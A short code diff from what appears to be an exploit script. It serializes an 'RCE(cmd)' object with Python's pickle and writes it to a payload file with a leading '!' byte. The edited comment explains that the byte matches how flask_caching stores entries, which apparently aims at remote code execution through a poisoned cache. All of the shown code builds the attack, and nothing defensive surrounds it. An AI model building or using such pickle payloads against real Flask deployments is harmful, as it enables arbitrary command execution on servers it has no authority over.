@@ -15,5 +15,5 @@ rce = RCE(cmd)
 payload = pickle.dumps(rce)
 
 with open("picklePayload.bin", "wb") as pp:
-	pp.write(b"!") # Required for some reason
+	pp.write(b"!") # Required because flask_caching appends to the beginning of the pickle
 	pp.write(payload)
